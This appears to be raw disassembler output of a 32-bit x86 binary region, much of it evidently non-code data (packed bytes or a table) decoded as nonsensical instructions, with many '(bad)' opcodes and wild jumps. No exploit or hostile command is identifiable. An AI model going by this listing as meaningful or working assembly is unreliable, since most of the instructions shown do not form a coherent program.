  424365:	adc    DWORD PTR [ecx+0x30bfcc3e],0xffffffd4
  42436c:	xlat   BYTE PTR ss:[ebx]
  42436e:	jge    0x424315
  424370:	or     DWORD PTR [esi+ecx*4-0x4b],esi
  424374:	popa   
  424375:	inc    esi
  424376:	jns    0x424326
  424378:	inc    edi
  424379:	and    cl,bl
  42437b:	jmp    0xcedb:0x638edae
  424382:	xchg   ebx,eax
  424383:	sahf   
  424384:	fadd   QWORD PTR [eax+0x31]
  424387:	ins    DWORD PTR es:[edi],dx
  424388:	fist   WORD PTR [ecx-0x6a4cd05e]
  42438e:	repnz fisubr WORD PTR ss:[ebx+0x56]
  424393:	mov    ch,0x43
  424395:	in     al,dx
  424396:	or     ebx,ebp
  424398:	and    al,0xf2
  42439a:	pop    ds
  42439b:	ret    
  42439c:	xlat   BYTE PTR ds:[ebx]
  42439d:	xchg   DWORD PTR [esi-0x31],ecx
  4243a0:	pop    ebp
  4243a1:	aaa    
  4243a2:	and    DWORD PTR [edx-0x78],eax
  4243a5:	mov    eax,0x384fd6c
  4243aa:	loop   0x424345
  4243ac:	out    dx,eax
  4243ad:	hlt    
  4243ae:	mov    al,ds:0xba303c37
  4243b3:	sub    al,0x13
  4243b5:	lods   eax,DWORD PTR ds:[esi]
  4243b6:	repz cmc 
  4243b8:	iret   
  4243b9:	mov    esi,0x297ebbef
  4243be:	adc    eax,DWORD PTR [ebx]
  4243c0:	(bad)  
  4243c1:	inc    ebp
  4243c2:	sbb    eax,0x75621159
  4243c7:	push   edx
  4243c8:	addr16 lahf 
  4243ca:	pop    es
  4243cb:	ret    
  4243cc:	popa   
  4243cd:	and    ebp,edi
  4243cf:	jnp    0x424421
  4243d1:	loope  0x4243a6
  4243d3:	lods   ax,WORD PTR ds:[esi]
  4243d5:	inc    esp
  4243d6:	sbb    esp,DWORD PTR [eax+0x23]
  4243d9:	(bad)  
  4243da:	or     esi,DWORD PTR [edx+0x4e]
  4243dd:	cmp    BYTE PTR [esp+edx*4+0x29a5aaca],ch
  4243e4:	sub    al,BYTE PTR [ebp-0x72cd5722]
  4243ea:	xchg   ecx,eax
  4243eb:	add    eax,0xd6b6b62c
  4243f0:	jg     0x424447
  4243f2:	mov    edi,0xcd5ef51b
  4243f7:	push   ss
  4243f8:	xchg   esi,eax
  4243f9:	pop    edx
  4243fa:	sub    ebx,DWORD PTR ds:0x1ffc2a92
  424400:	jl     0x424421
  424402:	push   esi
  424403:	popf   
  424404:	mov    ebp,DWORD PTR [ebx]
  424406:	test   BYTE PTR [eax+0x1a634530],dl
  42440c:	and    eax,0xdf619581
  424411:	push   ebp
  424412:	pop    ss
  424413:	xor    bh,BYTE PTR [edx-0x41]
  424416:	pop    ebx
  424417:	push   ebx
  424418:	mov    esi,0x79a50abf
  42441d:	shl    DWORD PTR [edx-0x62],1
  424420:	adc    al,0xe7
  424422:	scas   eax,DWORD PTR es:[edi]
  424423:	outs   dx,DWORD PTR gs:[esi]
  424425:	push   edx
  424426:	out    dx,al
  424427:	adc    BYTE PTR [ebx],dl
  424429:	leave  
  42442a:	pop    ebx
  42442b:	cmc    
  42442c:	sub    DWORD PTR [eax],esp
  42442e:	mov    edx,0xd3106ec9
  424433:	out    0x91,al
  424435:	call   0xbf3bfb90
  42443a:	idiv   DWORD PTR [edi+0xc]
  42443d:	xchg   ecx,eax
  42443e:	push   cs
  42443f:	or     DWORD PTR [esi+0x4885cd87],eax
  424445:	push   ecx
  424446:	daa    
  424447:	jne    0x424446
  424449:	mov    ecx,esp
  42444b:	push   esp
  42444c:	cmc    
  42444d:	xor    al,0xc3
  42444f:	fld    st(2)
  424451:	fisttp WORD PTR [ebp+0x66]
  424454:	dec    edi
  424455:	pop    edi
  424456:	jge    0x42447b
  424458:	and    cl,BYTE PTR [esi+0x444e5489]
  42445e:	push   esi
  42445f:	ja     0x4244c6
  424461:	add    al,0xc
  424463:	ss mov ecx,0xdbd95a33
  424469:	push   ds
  42446a:	(bad)  
  42446b:	xor    DWORD PTR [ebx+0x7b818e68],ebx
  424471:	ret    
  424472:	xor    al,0xc3
  424474:	in     eax,0x2e
  424476:	dec    ebp
  424477:	cli    
  424478:	add    eax,0x63d98943
  42447d:	pushf  
  42447e:	push   ss
  42447f:	aad    0x97
  424481:	int3   
  424482:	xchg   BYTE PTR [ebp+0x12b00755],ah
  424488:	sbb    DWORD PTR [ecx+0x65512dc0],ebp
  42448e:	inc    edi
  42448f:	add    esi,DWORD PTR [edi-0x35d8ea40]
  424495:	stos   DWORD PTR es:[edi],eax
  424496:	push   0x28
  424498:	loope  0x4244b6
  42449a:	lahf   
  42449b:	cmovo  esp,DWORD PTR [esi+0x26c3b46b]
  4244a2:	call   0x4997:0x5cf3f6e0
  4244a9:	ja     0x4244ae
  4244ab:	inc    ebp
  4244ac:	mov    ds:0x9af96b92,al
  4244b1:	je     0x4244e2
  4244b3:	into   
  4244b4:	test   BYTE PTR [edx+0x27],ch
  4244b7:	or     eax,0x8b0895e
  4244bc:	dec    edi
  4244bd:	ins    BYTE PTR es:[edi],dx
  4244be:	iret   
  4244bf:	fwait
  4244c0:	nop
  4244c1:	push   eax
  4244c2:	jge    0x424471
  4244c4:	mov    bl,BYTE PTR [esi]
  4244c6:	inc    esp
  4244c7:	add    al,0x21
  4244c9:	dec    edi
  4244ca:	dec    ecx
  4244cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244cc:	inc    edi
  4244cd:	mov    ds:0x4afa9228,eax
  4244d2:	cdq    
  4244d3:	std    
  4244d4:	psubb  mm7,QWORD PTR [ebx-0xd8b9e94]
  4244db:	iret   
  4244dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244dd:	jns    0x42449d
  4244df:	cmp    ecx,ecx
  4244e1:	mov    bl,0x3a
  4244e3:	inc    ecx
  4244e4:	cmp    edx,0xe43b62ca
  4244ea:	push   0x2a
  4244ec:	or     al,0x2a
  4244ee:	cs stos BYTE PTR es:[edi],al
  4244f0:	push   ss
  4244f1:	js     0x424558
  4244f3:	xor    al,0xee
  4244f5:	mov    DWORD PTR [ecx+0xe],edx
  4244f8:	addr16 hlt 
  4244fa:	ins    DWORD PTR es:[edi],dx
  4244fb:	cmp    eax,0x177abc5a
  424500:	(bad)  
  424501:	sub    DWORD PTR [ecx],edx
  424503:	jle    0x424520
  424505:	and    BYTE PTR [eax-0x67fc88e2],cl
  42450b:	aam    0x35
  42450d:	mov    dl,0xb0
  42450f:	sub    edi,DWORD PTR [edi-0x27a97bb2]
  424515:	test   ch,ah
  424517:	hlt    
  424518:	inc    edi
  424519:	das    
  42451a:	and    ah,dh
  42451c:	bound  esp,QWORD PTR [edx+0x259b05d6]
  424522:	mov    esi,DWORD PTR [eax+0x75]
  424525:	test   al,0xd4
  424527:	fs fs jecxz 0x424583
  42452b:	pop    ebp
  42452c:	in     al,dx
  42452d:	les    ebp,FWORD PTR [edx-0x68577e2]
  424533:	mov    dl,BYTE PTR [ebp+0x68]
  424536:	pop    DWORD PTR [edi]
  424538:	in     al,dx
  424539:	cmp    eax,0x56f3b78b
  42453e:	mov    dl,0x7e
  424540:	outs   dx,BYTE PTR ds:[esi]
  424541:	adc    DWORD PTR ds:0xec2c3657,0x1be7e8b4
  42454b:	sbb    bh,BYTE PTR [ecx+0x26]
  42454e:	pop    ebp
  42454f:	mov    edx,0x15050839
  424554:	popa   
  424555:	retf   0x6f2
  424558:	inc    eax
  424559:	dec    edx
  42455a:	sbb    eax,0x40dfec56
  42455f:	adc    DWORD PTR ds:0x1780fdb2,ecx
  424565:	cmp    DWORD PTR [ebp+ebp*4-0x6fa56326],edi
  42456c:	push   edx
  42456d:	fcmove st,st(5)
  42456f:	sar    BYTE PTR [ebx+eax*1],cl
  424572:	inc    ebx
  424573:	fwait
  424574:	jo     0x424580
  424576:	inc    eax
  424577:	fwait
  424578:	mov    ebx,0x17dc9677
  42457d:	test   eax,ecx
  42457f:	out    0x92,eax
  424581:	stos   DWORD PTR es:[edi],eax
  424582:	in     al,dx
  424583:	add    DWORD PTR [esi+0x2ffe3938],ebx
  424589:	mov    esp,0xb5974398
  42458e:	out    0xa3,al
  424590:	retf   0x3d17
  424593:	std    
  424594:	icebp  
  424595:	mov    BYTE PTR [ecx],bl
  424597:	fisubr WORD PTR [esi-0x59d32d74]
  42459d:	pop    edi
  42459e:	mov    ecx,0x23b575ae
  4245a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245a4:	sbb    esi,ecx
  4245a6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4245a8:	or     BYTE PTR [edx-0x44],dl
  4245ab:	mov    es,WORD PTR [esi+0xb]
  4245ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245af:	(bad)  
  4245b0:	std    
  4245b1:	or     BYTE PTR [esi-0x7cebaca0],bl
  4245b7:	mov    ah,0x6d
  4245b9:	xchg   esi,eax
  4245ba:	pop    ebp
  4245bb:	ret    0x7130
  4245be:	mov    DWORD PTR [esp+edx*2],ecx
  4245c1:	jmp    0xe576:0x3bcf19ea
  4245c8:	enter  0xb14c,0x17
  4245cc:	sub    BYTE PTR [ecx],dl
  4245ce:	mov    ebx,DWORD PTR [edi]
  4245d0:	jbe    0x424553
  4245d2:	or     al,0xa2
  4245d4:	mov    ch,dl
  4245d6:	clc    
  4245d7:	pop    esi
  4245d8:	fwait
  4245d9:	pop    edx
  4245da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245db:	jge    0x42463b
  4245dd:	ret    0xdafd
  4245e0:	shl    bl,1
  4245e2:	mov    ch,BYTE PTR [edi+edx*1]
  4245e5:	dec    edi
  4245e6:	mov    eax,ds:0xe2a50620
  4245eb:	loop   0x4245ce
  4245ed:	mov    cl,0xbd
  4245ef:	enter  0xe334,0xa1
  4245f3:	sub    ch,BYTE PTR [ecx-0x521ee0d3]
  4245f9:	rcl    BYTE PTR [ebp+0x62],1
  4245fc:	adc    BYTE PTR [edi-0x49],cl
  4245ff:	mov    eax,ds:0x24832da5
  424604:	in     al,0x2f
  424606:	push   cs
  424607:	outs   dx,DWORD PTR ds:[esi]
  424608:	adc    esp,DWORD PTR [edi]
  42460a:	mov    esi,0xeb592a15
  42460f:	fcmove st,st(2)
  424611:	mov    cl,0x9b
  424613:	out    dx,eax
  424614:	adc    edx,ecx
  424616:	(bad)  
  424617:	loop   0x42462b
  424619:	imul   eax,esp,0xffffffab
  42461c:	ja     0x42468f
  42461e:	or     BYTE PTR [eax-0x36],bl
  424621:	stos   BYTE PTR es:[edi],al
  424622:	jmp    0x73713740
  424627:	and    DWORD PTR [ebx],ebx
  424629:	jnp    0x4245e7
  42462b:	ret    0x89a
  42462e:	dec    ecx
  42462f:	push   eax
  424630:	mov    bh,bh
  424632:	and    esp,DWORD PTR [edx]
  424634:	lods   al,BYTE PTR ds:[esi]
  424635:	fwait
  424636:	stc    
  424637:	(bad)  
  424638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424639:	femms  
  42463b:	mov    ch,0xb5
  42463d:	or     bh,BYTE PTR [eax-0x201a527a]
  424643:	mov    esp,DWORD PTR [eax-0xf5e75cc]
  424649:	ins    BYTE PTR es:[edi],dx
  42464a:	add    esi,esp
  42464c:	or     esi,ebp
  42464e:	test   DWORD PTR [edx],0x297dc214
  424654:	add    eax,0xab754669
  424659:	or     dh,0x86
  42465c:	inc    ebp
  42465d:	lea    eax,[eax+0x4fc27bda]
  424663:	mov    edi,0x5a298b9c
  424668:	ror    DWORD PTR [eax+ebp*4-0x7d744525],0x29
  424670:	loope  0x4245f5
  424672:	push   eax
  424673:	xchg   edx,eax
  424674:	in     eax,dx
  424675:	shl    BYTE PTR [ecx+0x51d14383],0x4a
  42467c:	mov    ch,0x1e
  42467e:	shr    edi,1
  424680:	or     eax,0x1f600409
  424685:	push   ebp
  424686:	mov    al,BYTE PTR [ebp+0x2bd7ec8e]
  42468c:	je     0x42464a
  42468e:	xor    BYTE PTR [esi+eiz*8],0xe8
  424692:	pop    eax
  424693:	lock out 0x74,al
  424696:	and    edx,DWORD PTR [eax+0x4d]
  424699:	cdq    
  42469a:	jnp    0x42467b
  42469c:	mov    bh,0x75
  42469e:	fstp   QWORD PTR [ebp+0xf]
  4246a1:	scas   eax,DWORD PTR es:[edi]
  4246a2:	xchg   ecx,eax
  4246a3:	inc    DWORD PTR [esi-0x36]
  4246a6:	dec    ebp
  4246a7:	out    0xe4,al
  4246a9:	jp     0x424709
  4246ab:	(bad)  
  4246ac:	mov    edi,0x6af1f7ff
  4246b1:	test   BYTE PTR [ecx+eax*4-0x3e94693e],0x93
  4246b9:	xor    BYTE PTR [edx-0x4fff785],0x9d
  4246c0:	sub    esp,DWORD PTR [ebx+0x40]
  4246c3:	dec    ebx
  4246c4:	mov    al,ds:0xb086f4c4
  4246c9:	(bad)  
  4246ca:	and    edx,DWORD PTR [ecx]
  4246cc:	add    bh,0xf1
  4246cf:	aas    
  4246d0:	add    eax,0xbdde2736
  4246d5:	ins    DWORD PTR es:[edi],dx
  4246d6:	mov    ds:0xddb350e8,al
  4246db:	mov    al,0xe4
  4246dd:	fcomi  st,st(2)
  4246df:	int    0x17
  4246e1:	adc    eax,0x23799923
  4246e6:	mov    bl,0xff
  4246e8:	popa   
  4246e9:	sub    bl,dl
  4246eb:	mov    dl,BYTE PTR [esi-0x1d]
  4246ee:	inc    edi
  4246ef:	xchg   esi,eax
  4246f0:	mov    BYTE PTR [ebx+ebp*2],cl
  4246f3:	std    
  4246f4:	test   eax,0x6c482b33
  4246f9:	repnz sbb al,0xc9
  4246fc:	pusha  
  4246fd:	cld    
  4246fe:	mov    ch,0xb3
  424700:	mov    dl,0x76
  424702:	std    
  424703:	es mov esp,0x4728a5d0
  424709:	fs push ecx
  42470b:	inc    ebx
  42470c:	ins    DWORD PTR es:[edi],dx
  42470d:	bound  eax,QWORD PTR [ebp-0x33]
  424710:	jo     0x424717
  424712:	pushf  
  424713:	outs   dx,DWORD PTR ds:[esi]
  424714:	pop    DWORD PTR [eax+0x6f4bd554]
  42471a:	mov    ebx,0x9582a54e
  42471f:	mov    esp,0x83098e9e
  424724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424725:	into   
  424726:	bound  edx,QWORD PTR [ecx]
  424728:	push   ecx
  424729:	test   BYTE PTR [ebp+0x48],ch
  42472c:	jo     0x424707
  42472e:	sbb    eax,0x3cd5619a
  424733:	ror    BYTE PTR [eax*8-0x7d9ea288],1
  42473a:	aad    0xd7
  42473c:	je     0x4247a4
  42473e:	pusha  
  42473f:	sub    BYTE PTR [esi-0x17da1efd],dh
  424745:	jge    0x424772
  424747:	lahf   
  424748:	imul   esi,DWORD PTR [ebx+0x1],0x63
  42474c:	jge    0x4247a0
  42474e:	inc    ebx
  42474f:	aad    0x8f
  424751:	adc    eax,0x83ba50ff
  424756:	xor    BYTE PTR ds:0x504c7e8a,dh
  42475c:	push   0x7e58d34
  424761:	mov    cl,0x92
  424763:	push   edi
  424764:	mov    ebx,DWORD PTR cs:[edx]
  424767:	xor    BYTE PTR [ecx],0x17
  42476a:	fstp   DWORD PTR [edx+0x7b]
  42476d:	xchg   edx,eax
  42476e:	push   edi
  42476f:	push   es
  424770:	fidiv  WORD PTR [eax-0x1a]
  424773:	shr    BYTE PTR [ecx],cl
  424775:	ins    DWORD PTR es:[edi],dx
  424776:	push   0xffffff8c
  424778:	pop    esp
  424779:	loope  0x4247cc
  42477b:	jo     0x4247b3
  42477d:	dec    edx
  42477e:	mov    al,ds:0xddfe5bd4
  424783:	push   ebx
  424784:	mov    DWORD PTR [ecx+0x7f50cef6],0x5d4c7f77
  42478e:	shl    DWORD PTR [ebx-0x26466ab6],1
  424794:	je     0x42476b
  424796:	pop    eax
  424797:	inc    esi
  424798:	xchg   edi,eax
  424799:	add    al,0x74
  42479b:	or     al,0x21
  42479d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42479e:	pop    DWORD PTR [edx+ecx*4]
  4247a1:	sar    DWORD PTR [eax-0x5cba4e3f],1
  4247a7:	mov    esp,0x715f2a92
  4247ac:	inc    edx
  4247ad:	je     0x424826
  4247af:	jbe    0x42474f
  4247b1:	scas   al,BYTE PTR es:[edi]
  4247b2:	mov    ecx,0x2276cf32
  4247b7:	push   0x5
  4247b9:	xor    cl,BYTE PTR [esi]
  4247bb:	mov    esp,DWORD PTR [eax+0x2e]
  4247be:	add    ecx,ecx
  4247c0:	or     DWORD PTR [eax+edx*4],0xffffffd7
  4247c4:	fcmovne st,st(7)
  4247c6:	in     eax,0xbe
  4247c8:	addr16 inc ecx
  4247ca:	pusha  
  4247cb:	inc    esp
  4247cc:	lods   eax,DWORD PTR ds:[esi]
  4247cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247ce:	cwde   
  4247cf:	xchg   edi,eax
  4247d0:	lea    esi,[edi]
  4247d2:	dec    esi
  4247d3:	cmp    DWORD PTR [esi],0x2d
  4247d6:	mov    dh,0x8f
  4247d8:	jle    0x4247a3
  4247da:	or     al,0x68
  4247dc:	sub    al,0xbc
  4247de:	ins    DWORD PTR es:[edi],dx
  4247df:	dec    eax
  4247e0:	aam    0xef
  4247e2:	imul   esi,DWORD PTR ds:0x8876b2c4,0x11748987
  4247ec:	mov    al,BYTE PTR [ecx+0x1f]
  4247ef:	xlat   BYTE PTR ds:[ebx]
  4247f0:	(bad)  
  4247f1:	push   ss
  4247f2:	sbb    BYTE PTR [esi+0x1ed03721],cl
  4247f8:	xor    dh,0x4a
  4247fb:	mov    BYTE PTR ds:0x81ee77d1,ch
  424801:	mov    bh,0xe3
  424803:	rol    BYTE PTR [esp+ebx*2-0x2f1277b1],1
  42480a:	dec    esp
  42480b:	sub    DWORD PTR [edi-0x4],esp
  42480e:	stos   BYTE PTR es:[edi],al
  42480f:	jle    0x4247ff
  424811:	sbb    ecx,DWORD PTR [esi-0x7a7ada2b]
  424817:	dec    ebp
  424818:	jecxz  0x42485a
  42481a:	inc    edi
  42481b:	push   esp
  42481c:	cdq    
  42481d:	inc    esp
  42481e:	js     0x4247d0
  424820:	arpl   di,di
  424822:	(bad)  
  424823:	je     0x4247ba
  424825:	cmp    eax,0x822bab51
  42482a:	sub    al,0xba
  42482c:	sti    
  42482d:	repz imul eax,esi,0x6e31b85a
  424834:	es in  eax,0xd2
  424837:	in     al,0xad
  424839:	fld    DWORD PTR [ebp+0x75]
  42483c:	imul   BYTE PTR [ebx+esi*4-0x31]
  424840:	out    dx,eax
  424841:	adc    DWORD PTR [esi],esp
  424843:	or     DWORD PTR ds:0xc6ed8ec3,ebx
  424849:	imul   ebx,DWORD PTR [eax-0x5a303672],0xffffff89
  424850:	or     eax,0xbddc94cb
  424855:	jle    0x42480c
  424857:	adc    edx,DWORD PTR [edi+0x4f]
  42485a:	or     al,0xcf
  42485c:	sub    ebp,DWORD PTR [edx-0x47]
  42485f:	xor    al,0x54
  424861:	pop    esi
  424862:	ficom  DWORD PTR [esi+0x6693b331]
  424868:	cdq    
  424869:	mov    ecx,0x665b2d0c
  42486e:	gs stc 
  424870:	repz push ebx
  424872:	mov    ah,0x35
  424874:	repz push eax
  424876:	mov    edi,0xac913be1
  42487b:	xchg   ecx,eax
  42487c:	lods   eax,DWORD PTR ds:[esi]
  42487d:	jmp    0x42487f
	...
  4248bf:	add    BYTE PTR [eax],al
  4248c1:	add    BYTE PTR [eax+0x78001020],bl
  4248c7:	add    edx,DWORD PTR [eax]
  4248c9:	add    BYTE PTR [ebp-0x9ffefa4],bh
  4248cf:	push   ebp
  4248d0:	adc    BYTE PTR [eax],al
  4248d2:	and    eax,0x3800107b
  4248d7:	cmp    DWORD PTR [eax],edx
  4248d9:	add    BYTE PTR [ebp+edx*1+0x1e9b0010],cl
  4248e0:	adc    BYTE PTR [eax],al
	...
  4258e2:	add    BYTE PTR [eax],dl
  4258e4:	add    BYTE PTR [eax],al
  4258e6:	in     al,dx
  4258e7:	add    BYTE PTR [eax],al
  4258e9:	add    BYTE PTR [edx],ch
  4258eb:	xor    BYTE PTR [eax],dh
  4258ed:	xor    BYTE PTR ds:0x58304c30,dh
  4258f3:	xor    BYTE PTR [esi+0x30],bl
  4258f6:	xor    BYTE PTR fs:[eax-0x65cf71d0],cl
  4258fd:	xor    BYTE PTR [eax-0x4ccf59d0],ah
  425903:	xor    al,al
  425905:	xor    bh,cl
  425907:	xor    BYTE PTR [edx-0x48ce51cf],ch
  42590d:	xor    esp,eax
  42590f:	xor    eax,ecx
  425911:	xor    DWORD PTR [ebp-0x60cc6ece],esp
  425917:	xor    ebp,DWORD PTR [esi-0x3acc47cd]
  42591d:	xor    edx,ebp
  42591f:	xor    ebx,ebp
  425921:	xor    esp,esp
  425923:	xor    ebp,edi
  425925:	xor    edi,ebp
  425927:	xor    ecx,DWORD PTR [eax]
  425929:	xor    al,0xc
  42592b:	xor    al,0x14
  42592d:	xor    al,0x28
  42592f:	xor    al,0x2e
  425931:	xor    al,0x40
  425933:	xor    al,0x46
  425935:	xor    al,0xf8
  425937:	xor    eax,0x360435fc
  42593c:	push   cs
  42593d:	sbb    esi,DWORD PTR ss:[esi]
  425940:	sub    esi,DWORD PTR [esi]
  425942:	xor    DWORD PTR [esi],esi
  425944:	cmp    eax,0x48364336
  425949:	ss dec esi
  42594b:	ss pop esp
  42594d:	ss push 0x7f367b36
  425953:	ss pop edi
  425955:	aaa    
  425956:	imul   esi,DWORD PTR [edi],0x7e
  425959:	aaa    
  42595a:	xor    BYTE PTR [edi],0x8d
  42595d:	aaa    
  42595e:	call   0xb637:0xb037a937
  425965:	aaa    
  425966:	ret    
  425967:	aaa    
  425968:	shl    DWORD PTR [edi],cl
  42596a:	mov    ah,0x38
  42596c:	mov    ebp,0xce38ca38
  425971:	cmp    dh,dl
  425973:	cmp    dl,ah
  425975:	cmp    dl,dh
  425977:	cmp    dh,dh
  425979:	cmp    BYTE PTR [ebx-0x33c53fc6],dh
  42597f:	cmp    ah,dl
  425981:	cmp    ch,dh
  425983:	cmp    dh,ch
  425985:	cmp    bh,bl
  425987:	cmp    al,BYTE PTR [edi]
  425989:	cmp    ecx,DWORD PTR [ebx+edi*1]
  42598c:	adc    eax,0x2a3b1b3b
  425991:	cmp    esi,DWORD PTR [ecx]
  425993:	cmp    esi,DWORD PTR [edi]
  425995:	cmp    eax,DWORD PTR [ebx+edi*1+0x30]
  425999:	cmp    al,0x34
  42599b:	cmp    al,0x3e
  42599d:	cmp    al,0x44
  42599f:	cmp    al,0x49
  4259a1:	cmp    al,0x52
  4259a3:	cmp    al,0x5b
  4259a5:	cmp    al,0x6a
  4259a7:	cmp    al,0x71
  4259a9:	cmp    al,0x77
  4259ab:	cmp    al,0x84
  4259ad:	cmp    al,0x9d
  4259af:	cmp    al,0xa6
  4259b1:	cmp    al,0xac
  4259b3:	cmp    al,0xb9
  4259b5:	cmp    al,0xc0
  4259b7:	cmp    al,0xce
  4259b9:	cmp    al,0xd7
  4259bb:	cmp    al,0xba
  4259bd:	cmp    eax,0x3dd13dc4
  4259c2:	loope  0x425a01
  4259c4:	out    0x3d,eax
  4259c6:	hlt    
  4259c7:	cmp    eax,0x3e013dfb
  4259cc:	or     BYTE PTR [esi],bh
  4259ce:	add    BYTE PTR [eax],ah
  4259d0:	add    BYTE PTR [eax],al
  4259d2:	dec    eax
  4259d3:	add    BYTE PTR [eax],al
  4259d5:	add    BYTE PTR [ebx],bh
  4259d7:	cmp    al,0x4c
  4259d9:	cmp    al,0x52
  4259db:	cmp    al,0x58
  4259dd:	cmp    al,0x65
  4259df:	cmp    al,0x73
  4259e1:	cmp    al,0x7f
  4259e3:	cmp    al,0x85
  4259e5:	cmp    al,0x94
  4259e7:	cmp    al,0x9a
  4259e9:	cmp    al,0xa5
  4259eb:	cmp    al,0xaf
  4259ed:	cmp    al,0xb6
  4259ef:	cmp    al,0xbc
  4259f1:	cmp    al,0xc8
  4259f3:	cmp    al,0xd6
  4259f5:	cmp    al,0xdc
  4259f7:	cmp    al,0xe9
  4259f9:	cmp    al,0xf0
  4259fb:	cmp    al,0xf6
  4259fd:	cmp    al,0x9
  4259ff:	cmp    eax,0x3d203d13
  425a04:	sub    al,0x3d
  425a06:	xor    DWORD PTR ds:0x3d403d3b,edi
  425a0c:	inc    ebp
  425a0d:	cmp    eax,0x3d513d4b
  425a12:	pop    eax
  425a13:	cmp    eax,0x30000000
  425a18:	add    BYTE PTR [eax],al
  425a1a:	or     al,0x1
  425a1c:	add    BYTE PTR [eax],al
  425a1e:	push   ebx
  425a1f:	xor    bl,BYTE PTR [ecx+0x32]
  425a22:	xor    ch,BYTE PTR gs:[ebx+0x32]
  425a26:	jae    0x425a5a
  425a28:	jns    0x425a5c
  425a2a:	test   BYTE PTR [edx],dh
  425a2c:	mov    BYTE PTR [edx],dh
  425a2e:	(bad)  
  425a2f:	xor    bl,BYTE PTR [esi-0x54cd5ace]
  425a35:	xor    bh,BYTE PTR [eax-0x27cd36ce]
  425a3b:	xor    ah,dh
  425a3d:	xor    ch,dl
  425a3f:	xor    bh,cl
  425a41:	xor    bh,bh
  425a43:	xor    ah,BYTE PTR [ecx+0x34]
  425a46:	addr16 xor al,0x1d
  425a49:	xor    eax,0x35333529
  425a4e:	cmp    BYTE PTR ds:0x355a3543,dh
  425a54:	arpl   WORD PTR ds:0x357a356d,si
  425a5a:	xchg   BYTE PTR ds:0x3591358b,dh
  425a60:	xchg   esi,eax
  425a61:	xor    eax,0x35a7359c
  425a66:	mov    ebx,0xce35c135
  425a6b:	xor    eax,0x3758374f
  425a70:	pop    esi
  425a71:	aaa    
  425a72:	jb     0x425aab
  425a74:	jnp    0x425aad
  425a76:	test   DWORD PTR [edi],esi
  425a78:	mov    WORD PTR [edi],?
  425a7a:	xchg   edx,eax
  425a7b:	aaa    
  425a7c:	sahf   
  425a7d:	aaa    
  425a7e:	lods   al,BYTE PTR ds:[esi]
  425a7f:	aaa    
  425a80:	mov    dl,0x37
  425a82:	shl    DWORD PTR [edi],0xc8
  425a85:	aaa    
  425a86:	into   
  425a87:	aaa    
  425a88:	(bad)  [edi]
  425a8a:	call   0x127a5dc6
  425a8f:	cmp    BYTE PTR [ecx],bl
  425a91:	cmp    BYTE PTR [edi],bl
  425a93:	cmp    BYTE PTR [eax+edi*1],ch
  425a96:	cmp    eax,0x49384338
  425a9b:	cmp    BYTE PTR [esi+0x38],dl
  425a9e:	pop    ebp
  425a9f:	cmp    BYTE PTR [eax+0x38],ch
  425aa2:	mov    BYTE PTR [eax],bh
  425aa4:	xchg   esp,eax
  425aa5:	cmp    BYTE PTR [ecx-0x43c74ec8],ah
  425aab:	cmp    dh,cl
  425aad:	cmp    ch,bl
  425aaf:	cmp    ah,ah
  425ab1:	cmp    dl,ch
  425ab3:	cmp    bh,dh
  425ab5:	cmp    BYTE PTR [esi],cl
  425ab7:	cmp    DWORD PTR [ecx],ebx
  425ab9:	cmp    DWORD PTR [esi],esp
  425abb:	cmp    DWORD PTR [edi-0x4fc55bc6],edx
  425ac1:	cmp    bh,BYTE PTR [edx+edi*1+0x3ae63ac8]
  425ac8:	idiv   DWORD PTR [edx]
  425aca:	(bad)  
  425acb:	cmp    al,BYTE PTR [ebx+edi*1]
  425ace:	adc    DWORD PTR [ebx],edi
  425ad0:	and    DWORD PTR [ebx],edi
  425ad2:	daa    
  425ad3:	cmp    esi,DWORD PTR [esi]
  425ad5:	cmp    edi,DWORD PTR ds:0x593b483b
  425adb:	cmp    esp,DWORD PTR [eax+0x3b]
  425ade:	cmp    si,WORD PTR [ebx+0x3b]
  425ae2:	xchg   edx,eax
  425ae3:	cmp    ebx,DWORD PTR [edi+0x163ba73b]
  425ae9:	cmp    eax,0x3d273d20
  425aee:	sub    eax,0x433d3d3d
  425af3:	cmp    eax,0x3d5f3d50
  425af8:	jae    0x425b37
  425afa:	jle    0x425b39
  425afc:	xchg   BYTE PTR ds:0x3d9c3d96,bh
  425b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b03:	cmp    eax,0x3dbc3daf
  425b08:	retf   
  425b09:	cmp    eax,0x3dd73dd1
  425b0e:	fidivr WORD PTR ds:0x3df83de9
  425b14:	(bad)  
  425b15:	cmp    eax,0x3e123e05
  425b1a:	dec    ebx
  425b1b:	ds push ecx
  425b1d:	ds pop esi
  425b1f:	ds gs add BYTE PTR ds:[eax+0x0],dl
  425b25:	add    BYTE PTR [eax+0x26000000],cl
  425b2b:	xor    DWORD PTR [ebx],esi
  425b2d:	xor    DWORD PTR [edx+0x31],eax
  425b30:	dec    ecx
  425b31:	xor    DWORD PTR [edi+0x31],ecx
  425b34:	pop    esp
  425b35:	xor    DWORD PTR [esi+0x31],ebp
  425b38:	ja     0x425b6b
  425b3a:	xor    DWORD PTR [ecx],0xffffff89
  425b3d:	xor    edx,eax
  425b3f:	xor    edx,ebx
  425b41:	xor    edx,edi
  425b43:	xor    esp,ebp
  425b45:	xor    esi,edi
  425b47:	xor    eax,DWORD PTR [ebx]
  425b49:	xor    al,0x7
  425b4b:	xor    al,0x10
  425b4d:	xor    al,0x1a
  425b4f:	xor    al,0x27
  425b51:	xor    al,0x33
  425b53:	xor    al,0x38
  425b55:	xor    al,0x3e
  425b57:	xor    al,0x43
  425b59:	xor    al,0x49
  425b5b:	xor    al,0xb6
  425b5d:	xor    eax,0x35d135be
  425b62:	xlat   BYTE PTR ds:[ebx]
  425b63:	xor    eax,0x386d3727
  425b68:	jno    0x425ba2
  425b6a:	jle    0x425ba4
  425b6c:	mov    bh,BYTE PTR [eax]
  425b6e:	xchg   ecx,eax
  425b6f:	cmp    BYTE PTR [edi-0x53c759c8],dl
